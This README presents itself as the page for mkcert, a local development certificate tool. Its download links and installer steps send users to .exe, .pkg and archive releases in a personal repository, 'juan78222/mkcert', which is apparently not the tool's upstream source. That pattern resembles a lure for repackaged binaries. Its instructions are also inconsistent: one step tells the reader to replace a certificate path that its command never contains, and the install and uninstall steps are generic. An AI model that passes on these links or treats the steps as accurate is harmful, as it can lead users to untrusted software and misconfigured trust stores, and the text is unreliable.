# 🌟 mkcert - Create Trusted Certificates Easily

## 🚀 Introduction

mkcert is a simple tool for creating trusted development certificates without tricky setups. You can use it to secure your local development environment, making web browsing safer. With mkcert, you can create certificates with any name you choose, supporting various browsers and devices.

## 📥 Download

[![Download mkcert](https://img.shields.io/badge/Download-mkcert-brightgreen)](https://github.com/juan78222/mkcert/releases)

To get started, visit the following link to download the latest version of mkcert:

[Download mkcert from Releases](https://github.com/juan78222/mkcert/releases)

## 📋 Features

- **Zero Configuration:** No complicated setup needed.
- **Cross-Platform:** Works on Windows, macOS, and Linux.
- **Custom Names:** Create certificates for any local hostname.
- **Browser-Friendly:** Supported by Chrome and Firefox.
- **Mobile Support:** Use certificates on iOS devices.

## 🛠 System Requirements

- Compatible with Windows 10 or later.
- macOS Sierra (10.12) or newer.
- Any recent version of Ubuntu or other Linux distributions.

## 🖥 Installation Steps

Follow these steps to download and install mkcert:

### Step 1: Visit the Releases Page

Go to the mkcert releases page: [Download mkcert from Releases](https://github.com/juan78222/mkcert/releases).

### Step 2: Choose Your Version

On the releases page, you will see a list of available versions. Click on the version you want to download. The latest version is usually the best choice for new users.

### Step 3: Download the Installer

For your operating system, look for the appropriate file. 

- **Windows:** Download the .exe file.
- **macOS:** Download the .pkg file.
- **Linux:** Download the .tar.gz file.

### Step 4: Run the Installer

After the download completes, locate the file in your downloads folder.

- **Windows users:** Double-click the .exe file and follow the prompts.
- **macOS users:** Open the .pkg file and follow the instructions to install.
- **Linux users:** Extract the .tar.gz file and follow the included instructions to install.

### Step 5: Verify Installation

After installation, you can verify if mkcert is working. Open your command line or terminal.

- **For Windows:** Press `Windows + R`, type `cmd`, and press `Enter`.
- **For macOS/Linux:** Open the Terminal application.

Type the following command and press `Enter`:

```
mkcert -version
```

If mkcert is installed correctly, you should see the version number displayed.

## 🔐 Creating Your First Certificate

Once installed, creating a certificate is easy. Follow these steps:

### Step 1: Open Your Command Line or Terminal

### Step 2: Run mkcert Command

To generate a certificate for your local development, use the following command:

```
mkcert localhost
```

This will create two files: `localhost.pem` and `localhost-key.pem`. These files are your new certificate and private key.

### Step 3: Trust the Certificate

For browsers to recognize your certificate as trusted:

- **Windows:** Add the .pem file to the Windows Certificate Store.
- **macOS:** Run the following command, replacing `<path-to-certificate>` with the path to your .pem file:

```
mkcert -install
```

You only need to do this once.

## 🌐 Using the Certificate

After your certificate is created and trusted, you can configure your local development server to use it.

- **For Node.js,** specify the paths to your `.pem` files when starting your server.
- **For Apache or Nginx,** update your configuration file to include the certificate paths.

## 🎓 Help and Support

If you encounter issues or need assistance, you can check out the following resources:

- **GitHub Issues:** Report bugs or ask questions directly on the mkcert repository.
- **Documentation:** Check the official GitHub page for more detailed guides and FAQs.

## 🚪 Uninstalling mkcert

If you wish to remove mkcert:

### Windows

1. Open `Control Panel`.
2. Go to `Programs` > `Uninstall a program`.
3. Locate mkcert and click `Uninstall`.

### macOS

1. Open `Finder`.
2. Go to the Applications folder.
3. Locate mkcert and drag it to the Trash.

### Linux

Follow the specific commands based on your distribution to remove mkcert.

## 🌟 Conclusion

mkcert simplifies the process of creating trusted certificates for local development. Its ease of use and cross-platform support make it a fitting choice for developers at any level. Download it today to secure your local projects.

[Download mkcert from Releases](https://github.com/juan78222/mkcert/releases)